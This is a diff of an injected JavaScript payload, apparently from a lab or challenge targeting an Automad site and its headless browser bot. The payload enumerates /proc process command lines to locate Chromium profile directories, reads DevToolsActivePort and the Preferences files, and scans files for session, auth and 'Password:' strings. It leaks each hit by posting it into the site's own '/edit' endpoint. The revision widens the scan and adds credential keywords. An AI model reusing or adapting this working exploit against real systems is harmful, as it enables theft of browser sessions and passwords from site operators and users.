@@ -1,6 +1,6 @@
 (async()=>{
-if(window.__codexRun0615af)return;
-window.__codexRun0615af=1;
+if(window.__codexRun0615ag)return;
+window.__codexRun0615ag=1;
 
 const post=t=>fetch('/edit',{method:'POST',keepalive:true,headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'title=csrf&content='+encodeURIComponent(String(t).replace(/[^A-Za-z0-9 !.:_\\/-]/g,' '))});
 const read=async p=>{
@@ -18,23 +18,41 @@ const readRange=async(p,o,l=1500)=>{
 
 const dirsFrom=c=>{
  let out=[];
- for(let x of c.matchAll(/\/tmp\/\.?org\.chromium\.Chromium\.scoped[_\.]dir\.[A-Za-z0-9]+/g)){
+ let s=c.replace(/\x00/g,' ');
+ for(let x of s.matchAll(/--user-data-dir=([^ ]+)/g)){
+  if(!out.includes(x[1]))out.push(x[1]);
+ }
+ for(let x of s.matchAll(/\/tmp\/\.?org\.chromium\.Chromium\.scoped[_\.]dir\.[A-Za-z0-9]+/g)){
   if(!out.includes(x[0]))out.push(x[0]);
  }
  return out;
 };
 
 const findDirs=async()=>{
- let dirs=[];
- for(let pid=1;pid<4000;pid++){
-  let [st,c]=await read('/proc/'+pid+'/cmdline');
-  if(st!==200||!c.includes('user-data-dir'))continue;
-  for(let dir of dirsFrom(c)){
-   if(!dirs.includes(dir)){
-    dirs.push(dir);
-    post('profile '+dir);
+ let dirs=[], seen=0;
+ for(let base=1;base<8000;base+=120){
+  let rows=await Promise.all(Array.from({length:120},async(_,i)=>{
+   let pid=base+i;
+   let [st,c]=await read('/proc/'+pid+'/cmdline');
+   if(st!==200)return [];
+   let s=c.replace(/\x00/g,' ');
+   if((s.includes('chrom')||s.includes('Chrome')||s.includes('driver'))&&seen<8){
+    seen++;
+    post('cmd '+pid+' '+s.slice(0,240));
+   }
+   let ds=dirsFrom(c);
+   if(ds.length)post('pid '+pid+' dirs '+ds.join(' '));
+   return ds;
+  }));
+  for(let ds of rows){
+   for(let d of ds){
+    if(!dirs.includes(d)){
+     dirs.push(d);
+     post('profile '+d);
+    }
    }
   }
+  if(dirs.length)break;
  }
  return dirs;
 };
@@ -46,28 +64,28 @@ const preview=async p=>{
 };
 
 const scanFile=async p=>{
- let ok=false;
- for(let off=0;off<2500000;off+=1400){
+ for(let off=0;off<4000000;off+=1400){
   let [st,d]=await readRange(p,off);
   if(st!==200){post('scan miss '+p+' '+st);return false}
   if(off===0)post('scan '+p+' '+st+' '+d.length+' '+d.slice(0,120));
   if(!d.replace(/\./g,'').length)break;
-  let keys=['admin-app','Automad','csrf','localhost','auth','session'];
+  let keys=['admin-app','Automad','csrf','localhost','auth','session','Name:','Password:'];
   let hits=keys.map(x=>d.indexOf(x)).filter(x=>x>=0);
   if(hits.length){
-   ok=true;
-   let i=Math.max(0,Math.min(...hits)-60);
-   post('hit '+p+' '+off+' '+d.slice(i,Math.min(d.length,i+360)));
+   let i=Math.max(0,Math.min(...hits)-70);
+   post('hit '+p+' '+off+' '+d.slice(i,Math.min(d.length,i+420)));
+   return true;
   }
  }
- return ok;
+ return false;
 };
 
-post('profile scan 0615af');
+post('profile scan 0615ag');
 let dirs=await findDirs();
 if(!dirs.length){post('profile none');return}
 
 for(let dir of dirs){
+ await preview(dir+'/DevToolsActivePort');
  await preview(dir+'/Local State');
  await preview(dir+'/Default/Preferences');
  await preview(dir+'/Default/Secure Preferences');
